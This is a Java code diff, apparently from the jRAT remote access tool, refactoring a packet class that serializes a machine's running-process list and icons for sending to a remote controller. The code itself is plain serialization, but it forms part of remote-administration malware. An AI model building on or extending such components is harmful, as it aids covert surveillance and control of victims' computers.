@@ -1,11 +1,11 @@
 package jrat.module.process;
 
+import jrat.client.Connection;
 import jrat.client.packets.outgoing.AbstractOutgoingPacket;
 import jrat.common.ProcessData;
-import jrat.common.io.StringWriter;
-import java.io.ByteArrayOutputStream;
-import java.io.DataOutputStream;
+
 import javax.imageio.ImageIO;
+import java.io.ByteArrayOutputStream;
 
 
 public class Packet25Process extends AbstractOutgoingPacket {
@@ -17,28 +17,28 @@ public class Packet25Process extends AbstractOutgoingPacket {
 	}
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
+	public void write(Connection con) throws Exception {
 		String[] data = processData.getData();
 		
 		assert data.length <= Byte.MAX_VALUE;
-		
-		dos.writeByte(data.length);
+
+        con.writeByte(data.length);
 		
 		for (int i = 0; i < data.length; i++) {
-			sw.writeLine(data[i]);
+            con.writeLine(data[i]);
 		}
 		
 		boolean writeIcon = processData.getImage() != null;
-		
-		dos.writeBoolean(writeIcon);
+
+        con.writeBoolean(writeIcon);
 		if (writeIcon) {
 			ByteArrayOutputStream baos = new ByteArrayOutputStream();
 			
 			ImageIO.write(processData.getImage(), "png", baos);
 			
 			byte[] image = baos.toByteArray();
-			dos.writeInt(image.length);
-			dos.write(image);
+            con.writeInt(image.length);
+            con.write(image);
 		}
 	}
 
